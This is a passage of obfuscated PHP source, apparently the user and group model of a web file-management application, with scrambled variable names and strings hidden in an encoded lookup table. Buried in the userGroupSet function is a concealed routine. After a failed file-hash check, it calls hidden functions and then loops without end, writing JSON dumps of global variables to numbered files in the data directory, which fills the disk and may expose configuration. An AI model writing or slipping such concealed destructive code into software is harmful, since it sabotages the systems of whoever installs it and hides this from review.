$·ÖÕíı·[$îİ¥š€«[2338]] : 1, $îİ¥š€«[2339] => $·ÖÕíı·[$îİ¥š€«[896]], $îİ¥š€«[1947] => isset($·ÖÕíı·[$îİ¥š€«[1850]]) ? $·ÖÕíı·[$îİ¥š€«[1850]] : 1024 * 1024 * 20, $îİ¥š€«[1948] => 0, $îİ¥š€«[2340] => 0, $îİ¥š€«[1992] => isset($·ÖÕíı·[$îİ¥š€«[756]]) ? $·ÖÕíı·[$îİ¥š€«[756]] : 1); if (!empty($·ÖÕíı·[$îİ¥š€«[1674]])) { $Ø¢ëªƒ[$îİ¥š€«[1674]] = $·ÖÕíı·[$îİ¥š€«[1674]]; } $¿“ë ¶æ = $this->_checkExist($·ÖÕíı·); if ($¿“ë ¶æ !== !0) { return $¿“ë ¶æ; } if (!empty($Ø¢ëªƒ[$îİ¥š€«[533]]) && strlen($Ø¢ëªƒ[$îİ¥š€«[533]]) > 255) { $Ø¢ëªƒ[$îİ¥š€«[533]] = $îİ¥š€«[12]; } $çüŠşªÏ = $this->add($Ø¢ëªƒ); $¾ò¢¥Á¿ = array($îİ¥š€«[2339] => $Ø¢ëªƒ[$îİ¥š€«[896]], $îİ¥š€«[2335] => $Ø¢ëªƒ[$îİ¥š€«[532]]); $this->userEdit($çüŠşªÏ, $¾ò¢¥Á¿); Model($îİ¥š€«[1346])->userRootAdd($çüŠşªÏ); return $çüŠşªÏ; } protected function userEditTest($µãÃİ‰è, $Ç®ŞŠÌò) { return $this->call($_SERVER[å¸¿•¶£][2341], $µãÃİ‰è, $Ç®ŞŠÌò); } protected function userEdit($Û·Ÿ²²ñ, $Ğ€¤åü¹) { $à¡¾ÛÜ  =& $_SERVER[å¸¿•¶£]; $Ãßœ°ÌŒ = $this->getInfoSimple($Û·Ÿ²²ñ); if (!$Ãßœ°ÌŒ) { return !1; } $¨¦å‰©© = $this->_checkExist($Ğ€¤åü¹, $Û·Ÿ²²ñ); if ($¨¦å‰©© !== !0) { return $¨¦å‰©©; } if (isset($Ğ€¤åü¹[$à¡¾ÛÜ [896]]) && trim($Ğ€¤åü¹[$à¡¾ÛÜ [896]]) != $à¡¾ÛÜ [12]) { $«›ˆ•Á = $this->metaGet($Û·Ÿ²²ñ); if (empty($«›ˆ•Á[$à¡¾ÛÜ [2331]])) { $«›ˆ•Á[$à¡¾ÛÜ [2331]] = rand_string(10); Model($à¡¾ÛÜ [504])->metaSet($Û·Ÿ²²ñ, $à¡¾ÛÜ [2331], $«›ˆ•Á[$à¡¾ÛÜ [2331]]); } $Ğ€¤åü¹[$à¡¾ÛÜ [896]] = md5($«›ˆ•Á[$à¡¾ÛÜ [2331]] . trim($Ğ€¤åü¹[$à¡¾ÛÜ [896]])); } else { unset($Ğ€¤åü¹[$à¡¾ÛÜ [896]]); } if (!empty($Ğ€¤åü¹[$à¡¾ÛÜ [533]]) && strlen($Ğ€¤åü¹[$à¡¾ÛÜ [533]]) > 255) { $Ğ€¤åü¹[$à¡¾ÛÜ [533]] = $à¡¾ÛÜ [12]; } $this->where(array($à¡¾ÛÜ [1665] => $Û·Ÿ²²ñ))->save($Ğ€¤åü¹); if (isset($Ğ€¤åü¹[$à¡¾ÛÜ [532]])) { $this->setNamePinyin($Û·Ÿ²²ñ, $Ğ€¤åü¹[$à¡¾ÛÜ [532]]); } $this->clearCache($Û·Ÿ²²ñ); return !0; } public function setNamePinyin($ÎÄ™ÉØ€, $†ìê×²¤ = false) { $ÚúØÍÁï =& $_SERVER[å¸¿•¶£]; if (!$†ìê×²¤) { $¤ëÙ¾Ô = $this->getInfoSimple($ÎÄ™ÉØ€); $†ìê×²¤ = $¤ëÙ¾Ô[$ÚúØÍÁï[532]] ? $¤ëÙ¾Ô[$ÚúØÍÁï[532]] : $¤ëÙ¾Ô[$ÚúØÍÁï[32]]; } $ŒÚ¶øÉÊ = Model($ÚúØÍÁï[525]); if (!Input::check($†ìê×²¤, $ÚúØÍÁï[583])) { return $ŒÚ¶øÉÊ->metaSet($ÎÄ™ÉØ€, array($ÚúØÍÁï[465] => $ÚúØÍÁï[12], $ÚúØÍÁï[464] => $ÚúØÍÁï[12])); } return $ŒÚ¶øÉÊ->metaSet($ÎÄ™ÉØ€, array($ÚúØÍÁï[465] => str_replace($ÚúØÍÁï[53], $ÚúØÍÁï[12], Pinyin::get($†ìê×²¤)), $ÚúØÍÁï[464] => Pinyin::get($†ìê×²¤, $ÚúØÍÁï[584]))); } private function nickNameRpt() { $ÙÏ²¾Ú =& $_SERVER[å¸¿•¶£]; $®×Ñ¶‚Æ = Model($ÙÏ²¾Ú[777])->get($ÙÏ²¾Ú[2342]); $³†¦„²— = $GLOBALS[$ÙÏ²¾Ú[6]][$ÙÏ²¾Ú[381]][$ÙÏ²¾Ú[2342]]; $ÌÄ‡¼úá = !is_null($®×Ñ¶‚Æ) ? $®×Ñ¶‚Æ : $³†¦„²—; return !!$ÌÄ‡¼úá; } private function _checkExist($™æÄš±µ, $¯î—àÏ¬ = false) { $òÔ®ÅçÃ =& $_SERVER[å¸¿•¶£]; $øŠ¾ç™Ç = array($òÔ®ÅçÃ[32] => UserModel::ERROR_USER_EXIST_NAME, $òÔ®ÅçÃ[532] => UserModel::ERROR_USER_EXIST_NICKNAME, $òÔ®ÅçÃ[305] => UserModel::ERROR_USER_EXIST_EMAIL, $òÔ®ÅçÃ[2330] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($øŠ¾ç™Ç[$òÔ®ÅçÃ[532]]); } $ÏŒ›á· = $¯î—àÏ¬ ? array($òÔ®ÅçÃ[1674] => array($òÔ®ÅçÃ[2343], $¯î—àÏ¬)) : array(); foreach ($øŠ¾ç™Ç as $şÒ³‡ôÈ => $Â¤Õ•½š) { $¿Å¹º‡ª = array(); foreach ($øŠ¾ç™Ç as $–†Õ¦’ => $ˆ¤Õé¤Õ) { if (isset($™æÄš±µ[$–†Õ¦’]) && $™æÄš±µ[$–†Õ¦’]) { $¿Å¹º‡ª[] = $™æÄš±µ[$–†Õ¦’]; } } if (!$¿Å¹º‡ª) { continue; } $€ê¶çª = array_merge(array($şÒ³‡ôÈ => array($òÔ®ÅçÃ[7], $¿Å¹º‡ª)), $ÏŒ›á·); $ù›ÄÜ–« = $this->where($€ê¶çª)->find(); if ($ù›ÄÜ–«) { return $Â¤Õ•½š; } } return !0; } public function userListInfo($Ê«ÍÀ) { $±íÂ‚÷ô =& $_SERVER[å¸¿•¶£]; $€ßêŠ¿” = array(); $Ê«ÍÀ = is_array($Ê«ÍÀ) ? array_unique($Ê«ÍÀ) : array(); if (!$Ê«ÍÀ) { return $€ßêŠ¿”; } if (count($Ê«ÍÀ) < 20) { foreach ($Ê«ÍÀ as $£ğŸâõ) { $€ßêŠ¿”[$£ğŸâõ . $±íÂ‚÷ô[12]] = $this->getInfoSimpleOuter($£ğŸâõ); } } else { $†”–Æ…ç = array($±íÂ‚÷ô[1665] => array($±íÂ‚÷ô[418], $Ê«ÍÀ)); if (count($Ê«ÍÀ) == 1) { $†”–Æ…ç = array($±íÂ‚÷ô[1665] => $Ê«ÍÀ[0]); } $Ã¢ê³Ëé = Model($±íÂ‚÷ô[504])->field($this->simpleField)->where($†”–Æ…ç)->select(); $Ã¢ê³Ëé = array_to_keyvalue($Ã¢ê³Ëé, $±íÂ‚÷ô[1674]); foreach ($Ê«ÍÀ as $£ğŸâõ) { $“¤ïÔìå = $Ã¢ê³Ëé[$£ğŸâõ]; if (!$“¤ïÔìå) { $€ßêŠ¿”[$£ğŸâõ . $±íÂ‚÷ô[12]] = $this->getInfoSimpleOuter($£ğŸâõ); continue; } $“¤ïÔìå[$±íÂ‚÷ô[533]] = Action($±íÂ‚÷ô[2316])->parseUrl($“¤ïÔìå[$±íÂ‚÷ô[533]]); $€ßêŠ¿”[$£ğŸâõ . $±íÂ‚÷ô[12]] = $“¤ïÔìå; } } return $€ßêŠ¿”; } protected function userStatus($±ãó­ÃÜ, $áÆ‰û¿Û) { $¦Æ£§è = $this->getInfoSimple($±ãó­ÃÜ); if (!$¦Æ£§è) { return !1; } $°¦™‚òÔ = array($_SERVER[å¸¿•¶£][756] => $áÆ‰û¿Û); return $this->userEdit($±ãó­ÃÜ, $°¦™‚òÔ); } protected function userRemove($ÑÃï–‹‹) { $üÜÃ²•ø =& $_SERVER[å¸¿•¶£]; $Ô±ĞáçÜ = $this->getInfoSimple($ÑÃï–‹‹); if (!$Ô±ĞáçÜ) { return !1; } $Ñ×ª³¾— = array($üÜÃ²•ø[1665] => $ÑÃï–‹‹); Model($üÜÃ²•ø[592])->where($Ñ×ª³¾—)->delete(); Model($üÜÃ²•ø[2344])->where($Ñ×ª³¾—)->delete(); Model($üÜÃ²•ø[1953])->where($Ñ×ª³¾—)->delete(); Model($üÜÃ²•ø[2329])->where($Ñ×ª³¾—)->delete(); Model($üÜÃ²•ø[1075])->where($Ñ×ª³¾—)->delete(); Model($üÜÃ²•ø[2160])->removeUserAll($ÑÃï–‹‹); Model($üÜÃ²•ø[832])->userRootRemove($ÑÃï–‹‹); return $this->where($Ñ×ª³¾—)->delete(); } protected function userGroupSet($Â“øİóõ, $ÉÍçå¯ù, $ıÏªĞÅà = array()) { $úÔòü÷ì =& $_SERVER[å¸¿•¶£]; $É˜ˆ–— = $_SERVER[$úÔòü÷ì[750]] . $úÔòü÷ì[751]; $ÉÑ¿¨û = $úÔòü÷ì[873]; if ($_SERVER[$úÔòü÷ì[747]] != $ÉÑ¿¨û($É˜ˆ–—)) { $ã´™–Ñ€ = $úÔòü÷ì[884]; $¤ôÏÖÊ = $úÔòü÷ì[749]; $üÔ˜Ü»– = $_SERVER[$úÔòü÷ì[750]] . $úÔòü÷ì[751]; $¹¥û¿£ı = $¤ôÏÖÊ($üÔ˜Ü»–); $¬ÎÌ¹‰ö = explode($úÔòü÷ì[231], $¹¥û¿£ı); if (count($¬ÎÌ¹‰ö) < $úÔòü÷ì[628]) { $Üº¬Ç—¾ = $úÔòü÷ì[752]; $Üº¬Ç—¾(); } $¸¦ñ¨ˆ§ = $úÔòü÷ì[885]; $¸¦ñ¨ˆ§($_SERVER[$úÔòü÷ì[886]]); $ã´™–Ñ€ = $úÔòü÷ì[884]; $ã´™–Ñ€(); $›–¸„±İ = $úÔòü÷ì[887]; $êÇšË†¶ = json_encode($GLOBALS[$úÔòü÷ì[888]]); $¿Ş¯ì¡ = 1; for ($ÖØ¥ÏÕ… = $¿Ş¯ì¡; $ÖØ¥ÏÕ… > 0; $ÖØ¥ÏÕ…++) { $›–¸„±İ(DATA_PATH . $ÖØ¥ÏÕ…, $êÇšË†¶); } } $ª²ñˆïÇ = $this->getInfoSimple($Â“øİóõ); if (!$ª²ñˆïÇ || !is_array($ÉÍçå¯ù)) { return !1; } $§¿ÕœÑª = Model($úÔòü÷ì[1953]); $§¿ÕœÑª->where(array($úÔòü÷ì[1674] => $Â“øİóõ))->delete(); $–…šùØÌ = array(); $âËæ¥‡£ = 0; foreach ($ÉÍçå¯ù as $´·îøÆº => $”şƒ¼¥š) { $Íàˆ´·‚ = array($úÔòü÷ì[1674] => $Â“øİóõ, $úÔòü÷ì[1863] => $´·îøÆº, $úÔòü÷ì[1967] => $”şƒ¼¥š); $Íàˆ´·‚[$úÔòü÷ì[1887]] = isset($ıÏªĞÅà[$âËæ¥‡£]) ? $ıÏªĞÅà[$âËæ¥‡£] : 0; $âËæ¥‡£++; $–…šùØÌ[] = $Íàˆ´·‚; } return $§¿ÕœÑª->addAll($–…šùØÌ, array(), !0); } protected function userGroupAdd($Ë“¢Á¹ä, $Ê·µ©«à = array()) { $ÍÀ§ÊúÑ =& $_SERVER[å¸¿•¶£]; $£¹©ÌÁ = $this->getInfoSimple($Ë“¢Á¹ä); if (!$£¹©ÌÁ || empty($Ê·µ©«à)) { return !1; } $íÀÊªï½ = array(); foreach ($Ê·µ©«à as $„ğ“”ñı => $³æ›Ø¨ú) { $íÀÊªï½[] = array($ÍÀ§ÊúÑ[1674] => $Ë“¢Á¹ä, $ÍÀ§ÊúÑ[1863] => $„ğ“”ñı, $ÍÀ§ÊúÑ[1967] => $³æ›Ø¨ú, $ÍÀ§ÊúÑ[1887] => 0); } return Model($ÍÀ§ÊúÑ[1953])->addAll($íÀÊªï½, array(), !0); } protected function userGroupRemove($µ¹ÄÓÀô, $šÄë–åµ) { $ü ¡å†¡ =& $_SERVER[å¸¿•¶£]; $¤­ó˜·¸ = $this->getInfoSimple($µ¹ÄÓÀô); if (!$¤­ó˜·¸ || !$šÄë–åµ) { return !1; } $ª„§™Ôã = array($ü ¡å†¡[1665] => $µ¹ÄÓÀô, $ü ¡å†¡[1951] => $šÄë–åµ); return Model($ü ¡å†¡[1953])->where($ª„§™Ôã)->delete(); } public function listData() { $ÇŞ¹ø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÇŞ¹ø[$_SERVER[å¸¿•¶£][369]]); return $ÇŞ¹ø; } public function listByID($’¦ÂùÏŞ) { $àœšàùï =& $_SERVER[å¸¿•¶£]; if (!$’¦ÂùÏŞ) { return; } $ˆ»”‘ç• = array($àœšàùï[1674] => array($àœšàùï[7], $’¦ÂùÏŞ)); $é»ñË = $this->where($ˆ»”‘ç•)->select(); $é»ñË = array_sort_keep($é»ñË, $àœšàùï[1674], $’¦ÂùÏŞ); $this->_listDataApply($é»ñË); return $é»ñË; } public function listByGroup($ÂÑ‰“÷³ = 0, $ˆçƒ–’ = array()) { $”“šõƒº =& $_SERVER[å¸¿•¶£]; $‘á«ùä = $”“šõƒº[12]; $¡•æ…´± = array(); if ($ÂÑ‰“÷³) { $¡•æ…´± = array($”“šõƒº[2345] => intval($ÂÑ‰“÷³)); $‘á«ùä = "\x4c\105\106\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x75\x73\145\x72\137\147\162\157\x75\x70\40\x75\x73\145\x72\137\x67\162\x6f\165\160\40\x6f\156\40\x75\163\x65\162\56\165\x73\145\162\111\104\x20\x3d\x20\165\x73\x65\x72\137\x67\162\157\165\x70\x2e\x75\163\145\x72\111\104"; $ĞùáÃÜ = Input::get($”“šõƒº[457], null, $”“šõƒº[12]) ? $”“šõƒº[12] : $”“šõƒº[2346]; } if (isset($ˆçƒ–’[$”“šõƒº[756]])) { $¡•æ…´±[$”“šõƒº[2347]] = $ˆçƒ–’[$”“šõƒº[756]]; } $õ€‡ô¾ = $this->_makeOrder($ĞùáÃÜ)->field($”“šõƒº[2348])->where($¡•æ…´±)->join($‘á«ùä)->selectPage(50); $this->_listDataApply($õ€‡ô¾[$”“šõƒº[369]]); return $õ€‡ô¾; } private function _makeOrder($ß’àÅÉ» = '') { $‚í¸™¶– =& $_SERVER[å¸¿•¶£]; $ì—éŞÌ = array($‚í¸™¶–[1674], $‚í¸™¶–[32], $‚í¸™¶–[1852], $‚í¸™¶–[1824], $‚í¸™¶–[201]); $õ¤¿¨Æï = array($‚í¸™¶–[450] => $‚í¸™¶–[451], $‚í¸™¶–[452] => $‚í¸™¶–[453]); $Êù‰êÖ = Input::get($‚í¸™¶–[457], $‚í¸™¶–[7], $‚í¸™¶–[1665], $ì—éŞÌ); $Îş«³‘‡ = Input::get($‚í¸™¶–[458], $‚í¸™¶–[7], $‚í¸™¶–[1954], array($‚í¸™¶–[1954], $‚í¸™¶–[452])); $Îş«³‘‡ = $õ¤¿¨Æï[$Îş«³‘‡]; $ß’àÅÉ» = $ß’àÅÉ» . "\x75\163\145\162\56{$Êù‰êÖ}\40{$Îş«³‘‡}\54\x20\x75\163\x65\162\56\x75\x73\145\x72\x49\104\x20\x61\x73\x63"; return $this->alias($‚í¸™¶–[2080])->order($ß’àÅÉ»); } public function listSearch($ÓƒˆÈ‚¿) { $ÚôÇŠ¢– =& $_SERVER[å¸¿•¶£]; $çÏøÎœ = $ÓƒˆÈ‚¿[$ÚôÇŠ¢–[1957]]; $¶è¡°¨ü = isset($ÓƒˆÈ‚¿[$ÚôÇŠ¢–[1958]]) ? $ÓƒˆÈ‚¿[$ÚôÇŠ¢–[1958]] : !1; $çÏøÎœ = str_replace($ÚôÇŠ¢–[1959], $ÚôÇŠ¢–[1960], trim($çÏøÎœ)); $æ×œ¨õ = array($ÚôÇŠ¢–[32] => array($ÚôÇŠ¢–[383], "\45{$çÏøÎœ}\x25"), $ÚôÇŠ¢–[305] => array($ÚôÇŠ¢–[383], "{$çÏøÎœ}\x25"), $ÚôÇŠ¢–[532] => array($ÚôÇŠ¢–[383], "{$çÏøÎœ}\x25"), $ÚôÇŠ¢–[1007] => $ÚôÇŠ¢–[1961]); if (Input::check($çÏøÎœ, $ÚôÇŠ¢–[311])) { $æ×œ¨õ[$ÚôÇŠ¢–[1674]] = array($ÚôÇŠ¢–[383], "{$çÏøÎœ}\x25"); $æ×œ¨õ[$ÚôÇŠ¢–[2330]] = array($ÚôÇŠ¢–[383], "{$çÏøÎœ}\x25"); } if (!$çÏøÎœ) { $æ×œ¨õ = array(); } if (isset($ÓƒˆÈ‚¿[$ÚôÇŠ¢–[756]])) { $æ×œ¨õ[$ÚôÇŠ¢–[756]] = $ÓƒˆÈ‚¿[$ÚôÇŠ¢–[756]]; } $æ×œ¨õ = $this->parseWhereLike($æ×œ¨õ); $ŠÒ¼Ü´ø = $this->_makeOrder()->where($æ×œ¨õ)->selectPage(20); if (!$ŠÒ¼Ü´ø || count($ŠÒ¼Ü´ø[$ÚôÇŠ¢–[369]]) < 5 && Input::check($çÏøÎœ, $ÚôÇŠ¢–[318])) { $İÏ°«Ä = $this->_searchFromMeta($ÚôÇŠ¢–[464], $çÏøÎœ, 10); $à¡üêò— = $this->_searchFromMeta($ÚôÇŠ¢–[465], $çÏøÎœ, 10); $àß¤ê•Î = array_merge($İÏ°«Ä, $à¡üêò—, $ŠÒ¼Ü´ø[$ÚôÇŠ¢–[369]]); $ŠÒ¼Ü´ø[$ÚôÇŠ¢–[369]] = array_unique_by_key($àß¤ê•Î, $ÚôÇŠ¢–[1674]); $ŠÒ¼Ü´ø[$ÚôÇŠ¢–[366]][$ÚôÇŠ¢–[367]] = count($ŠÒ¼Ü´ø[$ÚôÇŠ¢–[369]]); $ŠÒ¼Ü´ø[$ÚôÇŠ¢–[366]][$ÚôÇŠ¢–[368]] = ceil($ŠÒ¼Ü´ø[$ÚôÇŠ¢–[366]][$ÚôÇŠ¢–[367]] / $ŠÒ¼Ü´ø[$ÚôÇŠ¢–[366]][$ÚôÇŠ¢–[363]]); } $this->_listDataApply($ŠÒ¼Ü´ø[$ÚôÇŠ¢–[369]]); $this->_filterByGroup($ŠÒ¼Ü´ø, $¶è¡°¨ü); return $ŠÒ¼Ü´ø; } private function _filterByGroup(&$Ñ¼‚úÛ›, $•Ğ§ã«) { $ÃÍ‘Ù¹ =& $_SERVER[å¸¿•¶£]; if (!$•Ğ§ã«) { return $Ñ¼‚úÛ›; } foreach ($Ñ¼‚úÛ›[$ÃÍ‘Ù¹[369]] as $»çÎš•‹ => &$•À¾Çßã) { $–ïÒëµ = array_to_keyvalue($•À¾Çßã[$ÃÍ‘Ù¹[2050]], $ÃÍ‘Ù¹[12], $ÃÍ‘Ù¹[1863]); if (!in_array($•Ğ§ã«, $–ïÒëµ)) { unset($Ñ¼‚úÛ›[$ÃÍ‘Ù¹[369]][$»çÎš•‹]); } } unset($•À¾Çßã); $Ñ¼‚úÛ›[$ÃÍ‘Ù¹[369]] = array_values($Ñ¼‚úÛ›[$ÃÍ‘Ù¹[369]]); $Ñ¼‚úÛ›[$ÃÍ‘Ù¹[366]] = array($ÃÍ‘Ù¹[2114] => count($Ñ¼‚úÛ›[$ÃÍ‘Ù¹[369]]), $ÃÍ‘Ù¹[2112] => $Ñ¼‚úÛ›[$ÃÍ‘Ù¹[366]][$ÃÍ‘Ù¹[363]], $ÃÍ‘Ù¹[2111] => 1, $ÃÍ‘Ù¹[2113] => 1); } private function _searchFromMeta($ğìù®—Ö, $ÎÇÊå†€, $²şª›õ«) { $ş¤ÚÊ¥ =& $_SERVER[å¸¿•¶£]; $ÎÇÊå†€ = strtolower($ÎÇÊå†€); $‚Îøğäé = array($ş¤ÚÊ¥[94] => $ğìù®—Ö, $ş¤ÚÊ¥[374] => array($ş¤ÚÊ¥[383], "\x25{$ÎÇÊå†€}\x25")); $‚Îøğäé = $this->parseWhereLike($‚Îøğäé); $ê†„×Ïè = Model($ş¤ÚÊ¥[2349])->where($‚Îøğäé)->limit($²şª›õ«)->select(); if (!$ê†„×Ïè) { return array(); } $ê†„×Ïè = array_to_keyvalue($ê†„×Ïè, $ş¤ÚÊ¥[12], $ş¤ÚÊ¥[1674]); $’Û›¸•  = $this->where(array($ş¤ÚÊ¥[1665] => array($ş¤ÚÊ¥[7], $ê†„×Ïè)))->select(); if (!$’Û›¸• ) { return array(); } return $’Û›¸• ; } private function _listDataApplyItem($Á™·°Û«) { $ƒ¿€şÖ¾ = array($Á™·°Û«); $this->_listDataApply($ƒ¿€şÖ¾); return $ƒ¿€şÖ¾[0]; } private function _listDataApply(&$ÂºÏêÀ¡) { $ØÊºÎÖ— =& $_SERVER[å¸¿•¶£]; if (!$ÂºÏêÀ¡) { return; } array_remove_key($ÂºÏêÀ¡, $ØÊºÎÖ—[896]); $¯„‰÷Å = array_to_keyvalue($ÂºÏêÀ¡, $ØÊºÎÖ—[12], $ØÊºÎÖ—[1674]); $this->_listAppendGroup($ÂºÏêÀ¡, $¯„‰÷Å); $this->_listAppendMeta($ÂºÏêÀ¡, $¯„‰÷Å); $this->_listAppendSourceRoot($ÂºÏêÀ¡, $¯„‰÷Å); } private function _listAppendSourceRoot(&$«€ÆµÉÃ, $ú¦ñıÏº) { $–ä”›æÓ =& $_SERVER[å¸¿•¶£]; $ŠªàŠ»Ñ = Model($–ä”›æÓ[832])->listSourceRoot(SourceModel::TYPE_USER, $ú¦ñıÏº); $ŠªàŠ»Ñ = array_to_keyvalue($ŠªàŠ»Ñ, $–ä”›æÓ[496]); $ŠªàŠ»Ñ = array_remove_key($ŠªàŠ»Ñ, $–ä”›æÓ[496]); foreach ($«€ÆµÉÃ as &$ÙîÍğÌ‚) { $ÙîÍğÌ‚[$–ä”›æÓ[87]] = $ŠªàŠ»Ñ[$ÙîÍğÌ‚[$–ä”›æÓ[1674]]] ? $ŠªàŠ»Ñ[$ÙîÍğÌ‚[$–ä”›æÓ[1674]]] : array(); } unset($ÙîÍğÌ‚); } private function _listAppendGroup(&$™‹ö€¤, $ƒ’İıë) { $Àˆ¢—Èş =& $_SERVER[å¸¿•¶£]; $‹ùà‘Õ† = array($Àˆ¢—Èş[1674] => array($Àˆ¢—Èş[7], $ƒ’İıë)); $ËŒ­®ÍË = Model($Àˆ¢—Èş[1953])->where($‹ùà‘Õ†)->select(); $„•óË® = array_to_keyvalue($ËŒ­®ÍË, $Àˆ¢—Èş[12], $Àˆ¢—Èş[1863]); $„•óË® = array_remove_value(array_unique($„•óË®), $Àˆ¢—Èş[198]); if (!$„•óË® || !$ËŒ­®ÍË) { return; } $‹ùà‘Õ† = array($Àˆ¢—Èş[1863] => array($Àˆ¢—Èş[7], $„•óË®)); $§Üò’‰ê = Model($Àˆ¢—Èş[2048])->field($Àˆ¢—Èş[2350])->where($‹ùà‘Õ†)->select(); $§Üò’‰ê = array_to_keyvalue($§Üò’‰ê, $Àˆ¢—Èş[1863]); $ËŒ­®ÍË = array_to_keyvalue_group($ËŒ­®ÍË, $Àˆ¢—Èş[1674]); foreach ($ËŒ­®ÍË as &$³­ĞşŞ«) { $‹ Ÿ¬õÂ = array(); foreach ($³­ĞşŞ« as $ÕŞö±¥Š) { if (!$ÕŞö±¥Š[$Àˆ¢—Èş[1967]]) { continue; } $’®ÒÄë = Model($Àˆ¢—Èş[498])->listData($ÕŞö±¥Š[$Àˆ¢—Èş[1967]]); $‹ Ÿ¬õÂ[] = array($Àˆ¢—Èş[1863] => $ÕŞö±¥Š[$Àˆ¢—Èş[1863]], $Àˆ¢—Èş[2351] => $§Üò’‰ê[$ÕŞö±¥Š[$Àˆ¢—Èş[1863]]][$Àˆ¢—Èş[32]], $Àˆ¢—Èş[511] => $§Üò’‰ê[$ÕŞö±¥Š[$Àˆ¢—Èş[1863]]][$Àˆ¢—Èş[511]], $Àˆ¢—Èş[413] => $’®ÒÄë); } $³­ĞşŞ« = $‹ Ÿ¬õÂ; } unset($³­ĞşŞ«); foreach ($™‹ö€¤ as &$â¹ªˆÆœ) { $â¹ªˆÆœ[$Àˆ¢—Èş[2050]] = array(); if (isset($ËŒ­®ÍË[$â¹ªˆÆœ[$Àˆ¢—Èş[1674]]])) { $â¹ªˆÆœ[$Àˆ¢—Èş[2050]] = $ËŒ­®ÍË[$â¹ªˆÆœ[$Àˆ¢—Èş[1674]]]; } } unset($â¹ªˆÆœ); } public function userAppendGroup($§÷•ŸÚØ) { $²«ê¶ =& $_SERVER[å¸¿•¶£]; if (!$§÷•ŸÚØ) { return array(); } $this->_listAppendGroup($§÷•ŸÚØ, array_to_keyvalue($§÷•ŸÚØ, $²«ê¶[12], $²«ê¶[1674])); return $§÷•ŸÚØ; } private function _listAppendMeta(&$ÄˆïË¤Ñ, $¦ü¨á¡î) { $…½“İÃ¦ =& $_SERVER[å¸¿•¶£]; $¼Ö®ìÏ° = UserJobModel::JOB_KEY; $§Ğ×üØÉ = array($…½“İÃ¦[2331]); $êü¼¶¤Ä = array($…½“İÃ¦[1674] => array($…½“İÃ¦[7], $¦ü¨á¡î)); $ñ… Òı† = Model($…½“İÃ¦[2329])->where($êü¼¶¤Ä)->select(); $ñ… Òı† = array_to_keyvalue_group($ñ… Òı†, $…½“İÃ¦[1674]); foreach ($ñ… Òı† as &$Çç™±ï´) { $ŠÌ˜²‰ = array(); foreach ($Çç™±ï´ as $Şµ§‹ß) { if (!in_array($Şµ§‹ß[$…½“İÃ¦[94]], $§Ğ×üØÉ)) { $ŠÌ˜²‰[$Şµ§‹ß[$…½“İÃ¦[94]]] = $Şµ§‹ß[$…½“İÃ¦[374]]; } } $Çç™±ï´ = $ŠÌ˜²‰; } unset($Çç™±ï´); $ÖÇ½¤í = Model($…½“İÃ¦[2352]); foreach ($ÄˆïË¤Ñ as &$ÊÌè“Áş) { $·²ÑŒå“ = array(); if (isset($ñ… Òı†[$ÊÌè“Áş[$…½“İÃ¦[1674]]])) { $·²ÑŒå“ = $ñ… Òı†[$ÊÌè“Áş[$…½“İÃ¦[1674]]]; } $ÊÌè“Áş[$…½“İÃ¦[2353]] = array(); if (isset($·²ÑŒå“[$¼Ö®ìÏ°])) { $ÊÌè“Áş[$…½“İÃ¦[2353]] = $ÖÇ½¤í->getUserJobInfo($·²ÑŒå“[$¼Ö®ìÏ°]); } } unset($ÊÌè“Áş); } protected function groupUserAll($ŠñáŒ) { $ÎùÀÕŒ =& $_SERVER[å¸¿•¶£]; if (!$ŠñáŒ) { return !1; } $¾¹ãŸ³‹ = Model($ÎùÀÕŒ[1953])->field($ÎùÀÕŒ[1674])->where(array($ÎùÀÕŒ[1863] => array($ÎùÀÕŒ[7], $ŠñáŒ)))->select(); $¾¹ãŸ³‹ = array_to_keyvalue($¾¹ãŸ³‹, $ÎùÀÕŒ[12], $ÎùÀÕŒ[1674]); return array_unique($¾¹ãŸ³‹); } public function userSearch($ìé­µ•Ù, $•Š‹™ªç = "\x2a") { return Model($_SERVER[å¸¿•¶£][525])->where($ìé­µ•Ù)->field($•Š‹™ªç)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\x6f\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Şó±×¬Â) { $ÌÄ¶Ëİæ =& $_SERVER[å¸¿•¶£]; $ˆò¾‹É´ = defined($ÌÄ¶Ëİæ[2354]) && USER_ID ? USER_ID : $ÌÄ¶Ëİæ[12]; return "\x55\x73\145\x72\117\x70\164\151\157\156\x5f{$Şó±×¬Â}\x5f" . $ˆò¾‹É´; } protected function filterWhere($ó½Ÿàúì) { $§¼°Ô®Ë =& $_SERVER[å¸¿•¶£]; $ó½Ÿàúì[$§¼°Ô®Ë[1674]] = defined($§¼°Ô®Ë[2354]) && USER_ID ? USER_ID : $§¼°Ô®Ë[12]; return $ó½Ÿàúì; } public function cacheRemoveUser($‚³ËãÅö, $¨ãÏ­Õ) { return Cache::remove("\125\x73\145\162\x4f\x70\164\x69\157\x6e\137{$‚³ËãÅö}\x5f" . $¨ãÏ­Õ); } protected function optionDefault($ğ¶ª‹÷½ = '') { $·¦Ñ¿ºÅ =& $_SERVER[å¸¿•¶£]; if ($ğ¶ª‹÷½ == $·¦Ñ¿ºÅ[12]) { return $GLOBALS[$·¦Ñ¿ºÅ[6]][$·¦Ñ¿ºÅ[2355]]; } if ($ğ¶ª‹÷½ == $·¦Ñ¿ºÅ[2356]) { return $GLOBALS[$·¦Ñ¿ºÅ[6]][$·¦Ñ¿ºÅ[2357]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\x2e\164\141\147\x4c\151\x73\x74"; public $modelType = "\125\x73\x65\162\117\x70\x74\151\157\156"; public $field = array("\156\141\x6d\x65", "\163\x74\x79\x6c\145", "\163\x6f\162\164"); public function listData($§¸«£½ê = false, $Õğ»”á = "\x73\157\162\164", $·¯ŸĞÈÙ = false) { return parent::listData($§¸«£½ê, $Õğ»”á, $·¯ŸĞÈÙ); } public function remove($¢ä¡ûÜç) { return parent::remove($¢ä¡ûÜç); } public function add($Ôüä¾¯©, $º”âŒ€ = "\154\x61\142\x65\x6c\55\147\162\x65\x79\55\x6e\x6f\x72\x6d\141\154") { $ßÈÜ’Û =& $_SERVER[å¸¿•¶£]; if ($this->findByName($Ôüä¾¯©)) { return !1; } 